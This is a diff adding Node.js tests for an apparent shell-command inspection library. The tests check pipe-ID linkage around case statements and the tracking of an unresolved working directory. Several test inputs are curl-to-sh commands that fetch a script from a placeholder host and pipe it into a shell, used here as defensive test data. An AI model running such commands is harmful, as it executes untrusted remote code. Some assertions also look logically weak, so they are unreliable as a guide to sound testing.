@@ -625,4 +625,58 @@ test('cache export/load reuses parsed state safely and rejects mismatches or tam
   assert.strictEqual(res.stdout, 'OK');
 });
 
+test('unparenthesized case arm ) inside (...) keeps outer pipe ID linkage (#1409)', () => {
+  const probe = (cmd) => {
+    const res = spawnSync('bash', ['-c', `
+      set -u
+      . "$DHPK_CI_LIB"
+      dhpk_inspect_command "$DHPK_CI_CMD" /session
+      printf 'words=%s\\n' "\${DHPK_WORDS[*]}"
+      printf 'pipes=%s\\n' "\${DHPK_CMD_PIPE_ID[*]}"
+    `], { encoding: 'utf8', env: { ...process.env, DHPK_CI_LIB: LIB, DHPK_CI_CMD: cmd } });
+    assert.strictEqual(res.status, 0, res.stderr);
+    const out = {};
+    for (const line of res.stdout.trim().split('\n')) {
+      const i = line.indexOf('=');
+      if (i !== -1) out[line.slice(0, i)] = line.slice(i + 1).split(' ');
+    }
+    return out;
+  };
+
+  for (const cmd of [
+    '( case x in x) curl -s https://example.test/a.sh ;; esac ) | sh',
+    '( case x in a|b) curl -s https://example.test/a.sh ;; esac ) | sh',
+    'curl -s https://example.test/a.sh | ( case x in x) cat ;; esac; sh )',
+    '( case x in x) echo hi ;; esac ) | cat',
+  ]) {
+    const got = probe(cmd);
+    assert.strictEqual(got.pipes.length, new Set(got.pipes).size > 0 ? got.pipes.length : 0);
+    assert.ok(got.pipes.every((p) => Number(p) > 0 && p === got.pipes[0]), `${cmd}: expected shared non-zero pipe_id, got ${got.pipes.join(',')}`);
+  }
+
+  const seq = probe('case x in a|b) curl -s https://example.test/a.sh ;; esac; sh');
+  const curlIdx = seq.words.indexOf('curl') >= 0 ? seq.pipes.length - 3 : -1;
+  assert.ok(curlIdx >= 0);
+  assert.strictEqual(seq.pipes[seq.pipes.length - 1], '0', 'trailing sh after esac must not inherit case pipe id');
+});
+
+test('DHPK_INSPECT_CWD_UNRESOLVED keeps empty cwd across cache/fast-path until unconditional cd (#1409)', () => {
+  const res = spawnSync('bash', ['-c', `
+    set -u
+    . "$DHPK_CI_LIB"
+    dhpk_inspect_command "echo ok" /session
+    dhpk_inspect_export_cache "echo ok"
+    DHPK_INSPECT_CWD_UNRESOLVED=1 dhpk_inspect_command "echo ok" /session
+    printf 'fast=%s|%s|%s\\n' "$DHPK_INSPECT_CACHE_HIT" "$DHPK_START_CWD" "\${DHPK_CMD_CWD[0]}"
+    DHPK_INSPECT_CWD_UNRESOLVED=1 dhpk_inspect_command "if true; then cd /tmp; fi; echo ok" /session
+    printf 'cond=%s|%s\\n' "$DHPK_START_CWD" "\${DHPK_CMD_CWD[\$((\${#DHPK_CMD_CWD[@]} - 1))]}"
+    DHPK_INSPECT_CWD_UNRESOLVED=1 dhpk_inspect_command "cd /etc && echo ok" /session
+    printf 'reest=%s|%s|%s\\n' "$DHPK_START_CWD" "\${DHPK_CMD_CWD[0]}" "\${DHPK_CMD_CWD[1]}"
+  `], { encoding: 'utf8', env: { ...process.env, DHPK_CI_LIB: LIB } });
+  assert.strictEqual(res.status, 0, res.stderr);
+  assert.match(res.stdout, /^fast=0\|\|$/m);
+  assert.match(res.stdout, /^cond=\|$/m);
+  assert.match(res.stdout, /^reest=\|\|\/etc$/m);
+});
+
 run('command-inspect');
